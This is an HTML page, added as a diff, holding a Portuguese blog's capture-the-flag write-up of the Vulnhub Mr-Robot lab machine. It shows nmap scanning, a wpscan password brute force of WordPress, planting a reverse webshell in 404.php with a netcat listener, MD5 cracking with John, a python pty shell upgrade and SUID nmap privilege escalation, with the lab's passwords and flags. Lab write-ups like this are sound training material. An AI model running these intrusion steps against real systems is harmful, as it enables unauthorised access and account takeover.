@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="pt">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>Writeup MR-Robot | Dark-Shellcode</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+    <link rel="shortcut icon" href="/images/favicon.jpg">
+
+    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 
+
+</head>
+
+
+    <body>
+      <div class="container">
+
+        <header class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <h1 class="">Dark-Shellcode</h1>
+    <p>
+    <span class="reserved">char</span> nick[<span class="number">9</span>] = <span class="string">"CorvodaMorte"</span>;
+    </p>
+    <p>
+    printf(<a href="https://github.com/darkshellcode" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
+    </p>
+    <p>
+    printf(<span class="string">"<span class="reserved">%s\x40</span>corvodamorte@protonmail<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,nick);
+    </p>
+    <!-- <p>
+            printf(<a href="https://darkshellcode.github.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.github.com<span class="reserved">\n</span>"</span></a>,nick);
+        </p> -->
+    <p>
+    puts(<a href="//" target="_blank"><span class="string">"64 61 72 6b 73 68 65 6c 6c 63 6f 64 65"</span></a>);
+    </p>
+  </div>
+</header>
+
+<div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <div class="menu">
+      <ul>
+          <li><a href="/">home</a></li>
+          <li><a href="/blog/">blog</a></li>
+          <li><a href="/projetos">projetos</a></li>
+          <li><a href="/writeup">writeup</a></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2">
+            <main>
+            <div class="post">
+
+  <header class="post-header">
+    <h1>Writeup MR-Robot</h1>
+  </header>
+
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header">
+    <p class="meta">
+        Aug 25, 2020
+        
+        
+        •
+        <span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#ctf" class="reserved">ctf</a>,</span><span><a href="/category/#hacking" class="reserved">hacking</a></span>
+    </p>
+  </header>
+
+  <article class="post-content">
+  <p><br /><br />
+<img src="/images/writeup/mr-robot/mrrobot.jpg" alt="" />
+<br /><br />
+Essa máquina é do site <a href="https://www.vulnhub.com/" target="_blank">Vulnhub</a> e tem três flags que tem que ser encontradas.
+<br /><br /></p>
+<h2 id="iniciando-a-fase-de-recon">Iniciando a fase de Recon</h2>
+<p><br /><br />
+Começo iniciando um scan de portas com <em>nmap</em> para identificar qual serviço está rodando no servidor e em qual porta.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/mr-robot# nmap <span class="nt">-T4</span> <span class="nt">--open</span> <span class="nt">-sV</span> 192.168.56.104
+<span class="c"># Nmap 7.80 scan initiated Wed Jun 17 16:41:47 2020 as: nmap -T4 --open -sV -oN nmap.scan 192.168.56.104</span>
+Nmap scan report <span class="k">for </span>192.168.56.104
+Host is up <span class="o">(</span>0.00054s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 filtered ports, 1 closed port
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd
+443/tcp open  ssl/http Apache httpd
+MAC Address: 08:00:27:AC:3A:B4 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Wed Jun 17 16:42:06 2020 -- 1 IP address (1 host up) scanned in 18.40 seconds</span>
+
+</code></pre></div></div>
+<p><br /><br />
+Vemos que tem apenas duas portas abertas no servidor, a porta 80 e 443 ambas rodando serviço web http. Acessando pelo navegador temos o seguinte site hospedado.
+<br /><br />
+<img src="/images/writeup/mr-robot/index.png" alt="" />
+<br /><br />
+A primeira coisa a fazer ao acessar um site é verificar o robots.txt onde pode conter informações muito importantes.
+<br /><br />
+<img src="/images/writeup/mr-robot/robots.png" alt="" />
+<br /><br />
+Aqui encontramos dois arquivos a primeira key de três que temos que encontrar e um arquivo que aparentemente é uma tipo de wordlist, primeiro acesso o <em>key-1-of-3.txt</em> para pegar a primeira <strong>flag</strong>.
+<br /><br />
+<img src="/images/writeup/mr-robot/key-1.png" alt="" />
+<br /><br />
+Acessou normalmente primeira flag :)</p>
+
+<p>Agora realizado o download do aquivo com a wordlist.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/mr-robot# wget http://192.168.56.104/fsocity.dic
+<span class="nt">--2020-06-17</span> 16:54:22--  http://192.168.56.104/fsocity.dic
+Conectando-se a 192.168.56.104:80... conectado.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 7245381 <span class="o">(</span>6,9M<span class="o">)</span> <span class="o">[</span>text/x-c]
+Salvando em: “fsocity.dic”
+
+fsocity.dic                              100%[<span class="o">===============================================================================&gt;]</span>   6,91M  31,0MB/s    em 0,2s    
+
+2020-06-17 16:54:22 <span class="o">(</span>31,0 MB/s<span class="o">)</span> - “fsocity.dic” salvo <span class="o">[</span>7245381/7245381]
+
+</code></pre></div></div>
+<p><br /><br />
+Verifico o conteúdo do arquivo para ver se realmente é algum tipo de wordlist.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/mr-robot# <span class="nb">head </span>fsocity.dic 
+<span class="nb">true
+false
+</span>wikia
+from
+the
+now
+Wikia
+extensions
+scss
+window
+</code></pre></div></div>
+<p><br /><br />
+Realmente é uma wordlist de palavras com certeza teremos que usá-la para realizar algum bruteforce mais para frente.</p>
+
+<p>Navegando pelo site e olhando seu codigo fonte nada foi encontrado então partimos para tentar identificar algum arquivo ou diretório que se possa acessar por url, para isso utilizo o dirsearch.
+<br /><br />
+<img src="/images/writeup/mr-robot/dirsearch.png" alt="" />
+<br /><br />
+No comando mandei ocultar todas respostas com código <strong>301</strong>,<strong>403</strong> assim não poluindo muito a tela, e retornou que encontrou um diretorio <strong>/wp-login</strong> o que significa que está rodando um wordpress, acessando para verificar.
+<br /><br />
+<img src="/images/writeup/mr-robot/login.png" alt="" />
+<br /><br /></p>
+
+<p>Tentando acessar com alguma senha padrão como usuário <em>admin</em> senha <em>admin</em> vemos que esse usuário não existe.
+<br /><br />
+<img src="/images/writeup/mr-robot/login-invalido.png" alt="" />
+<br /><br /></p>
+
+<p>Podemos usar isso para identificar algum usuário válido e como a máquina é referente ao seriado <strong>Mr-Robot</strong> para quem não assiste basta uma pesquisada no google para conseguir alguns nome de personagens principais.
+<br /><br />
+<img src="/images/writeup/mr-robot/personagens.png" alt="" />
+<br /><br />
+Após pegar os nomes basta tentar no login até o wordpress informar que o usuário existe, no exemplo utilizei o nome do personagem principal elliot.
+<br /><br />
+<img src="/images/writeup/mr-robot/login-elliot.png" alt="" />
+<br /><br />
+Observamos que a mensagem de erro alterou agora informa que o password para o usuário Elliot está incorreto, isso quer dizer que achamos um usuário válido.</p>
+
+<p>Como não temos a senha utilizarei a wordlist para realizar um bruteforce na página de login e para isso irei utilizar a ferramenta <strong>wpscan</strong>.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/mr-robot# wpscan <span class="nt">-U</span> elliot <span class="nt">-P</span> fsocity.dic <span class="nt">--url</span> http://192.168.56.104
+</code></pre></div></div>
+<p><br /><br />
+Como vemos o <em>wpscan</em> conseguiu identificar a senha através do bruteforce com o arquivo obtido anteriormente.
+<br /><br />
+<img src="/images/writeup/mr-robot/senha-wordpress.png" alt="" />
+<br /><br />
+Senha encontrada, <strong>Usuário</strong> : <em>Elliot</em> - <strong>Password</strong> : <em>ER28-0652</em> agora basta logar e acessar o wordpress.
+<br /><br />
+<img src="/images/writeup/mr-robot/logado.png" alt="" />
+<br /><br />
+Logado com sucesso :), mas ainda preciso conseguir um acesso <em>shell</em> ao sistema e como wordpress é feito em php basta alterar um dos arquivos .php e colocar uma webshell reverse, no caso utilizei o <strong>404.php</strong> e para isso fui em <strong>Appearance</strong> -&gt; <strong>Editor</strong> -&gt; <strong>404.php</strong>
+<br /><br />
+<img src="/images/writeup/mr-robot/404.png" alt="" /> 
+<br /><br />
+Exclui conteúdo do 404.php e coloquei uma webshell reverse para se conectar na minha máquina na porta <em>4445</em> e salvei a alteração clicando em <strong>Update File</strong> .
+<br /><br />
+<img src="/images/writeup/mr-robot/salvar-404.png" alt="" />
+<br /><br />
+Após alterar coloco o <em>netcat</em> na minha máquina para escutar na porta <em>4445</em> .
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/mr-robot# nc <span class="nt">-lvnnp</span> 4445
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::4445
+Ncat: Listening on 0.0.0.0:4445
+_
+</code></pre></div></div>
+<p><br /><br />
+Agora basta acessar o endereço http://192.168.56.104/404.php e verificar no * netcat* se o servidor realizou a conexão reversa.
+<br /><br />
+<img src="/images/writeup/mr-robot/nc-reverse.png" alt="" />
+<br /><br />
+Servidor se conectou com sucesso :) agora temos uma shell no servidor e podemos executar comando e procurar a segunda <strong>flag</strong> .</p>
+
+<p>Verifico o diretório home para descobrir qual usuário existe no sistema e se tenho acesso a algum arquivo, geralmente é onde se encontra <em>flag</em>.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd</span> /home
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 12
+drwxr-xr-x  3 root root 4096 Nov 13  2015 <span class="nb">.</span>
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
+</code></pre></div></div>
+<p><br /><br />
+Tem um usuário <em>robot</em> apesar de ser <strong>usuário</strong> e <strong>grupo</strong>  <em>root</em> temos permissão para acessar.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">pwd</span><span class="p">;</span> <span class="nb">ls</span> <span class="nt">-la</span>
+/home/robot
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 <span class="nb">.</span>
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+<span class="nt">-r--------</span> 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+<span class="nt">-rw-r--r--</span> 1 robot robot   39 Nov 13  2015 password.raw-md5
+</code></pre></div></div>
+<p><br /><br />
+Aqui está a segunda flag mas infelizmente não iremos conseguir ler já que apenas usuário robot tem permissão de leitura e nosso usuário e grupo como podemos ver é o <strong>daemon</strong> .
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1<span class="o">(</span>daemon<span class="o">)</span>
+</code></pre></div></div>
+<p><br /><br />
+Se tentamos ler temos o seguinte erro.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>key-2-of-3.txt
+<span class="nb">cat</span>: key-2-of-3.txt: Permission denied
+
+</code></pre></div></div>
+<p><br /><br />
+Mas temos um segundo arquivo <strong>password.raw-md5</strong> e esse temos permissão de leitura.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat  </span>password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+</code></pre></div></div>
+<p><br /><br />
+O nome do arquivo já facilita nosso trabalho ele já informa que se trata de um hash md5, então basta quebrar ela com um programa utilizei o <em>John the Ripper</em> com a wordlist <em>rockyou.txt</em> .
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/mr-robot# john <span class="nt">--format</span><span class="o">=</span>Raw-MD5 <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt password.raw-md5 
+</code></pre></div></div>
+<p><br /><br />
+<img src="/images/writeup/mr-robot/john-cracked.png" alt="" />
+<br /><br />
+Vemos que o <strong>john</strong> quebrou a hash e identificou a senha e ela é o alfabeto, vamos utilizar ela para alterar nosso usuário para robot e pegar a segunda <em>flag</em> mas para isso terei que melhorar nossa shell e utilizar uma tty com python  para conseguir utilizar o comando su e alterar para robot, já que essa máquina não tem o serviço <strong>ssh</strong> rodando.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+daemon@linux:/home/robot<span class="err">$</span>
+</code></pre></div></div>
+<p><br /><br />
+Agora com bash rodando altero meu login para usuário robot.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daemon@linux:/home/robot<span class="nv">$ </span>su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>robot<span class="o">)</span>
+</code></pre></div></div>
+<p><br /><br />
+Agora pegamos a segunda flag.
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robot@linux:~<span class="nv">$ </span><span class="nb">cat </span>key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+</code></pre></div></div>
+<p><br /><br />
+Para conseguir a ultima flag teremos que realizar uma escalação de privilégio, então faço uma pesquisa no servidor a procura de algum arquivo com <strong>suid</strong> que resumidamente quando em execução ele roda como usuário root.</p>
+
+<p>Rodo um find para realizar a busca em todo servidor e jogando todo erro para <strong>/dev/null</strong> e não poluir a tela.
+<br /><br />
+<img src="/images/writeup/mr-robot/find_suid.png" alt="" />
+<br /><br />
+Identifico um nmap com <strong>suid</strong> em uma versão antiga o nmap permitia utilizar uma função interativa e com isso podemos utilizar dessa falha para conseguir fazer uma elevação de previlégio.
+<br /><br />
+<img src="/images/writeup/mr-robot/privesc.png" alt="" />
+<br /><br />
+Agora temos uma shell com usuário e grupo root e só pegar a terceira flag e máquina finalizada :) .
+<br /><br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># pwd; ls -l</span>
+<span class="nb">pwd</span><span class="p">;</span> <span class="nb">ls</span> <span class="nt">-l</span>
+/root
+total 4
+<span class="nt">-rw-r--r--</span> 1 root root  0 Nov 13  2015 firstboot_done
+<span class="nt">-r--------</span> 1 root root 33 Nov 13  2015 key-3-of-3.txt
+<span class="c"># cat key-3-of-3.txt</span>
+<span class="nb">cat </span>key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4 
+</code></pre></div></div>
+<p><br /><br /></p>
+
+  </article>
+
+	<p class="feed-recomendation">
+		Gostou do post? Assina o <a href="/feed/">feed</a> e seja feliz!!
+	</p>
+
+</div>
+
+  </article>
+
+</div>
+
+            </main>
+          </div>
+        </div>
+
+        <div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <footer>
+      Thx!
+    </footer>
+  </div>
+</div>
+
+
+      </div>
+    </body>
+</html>
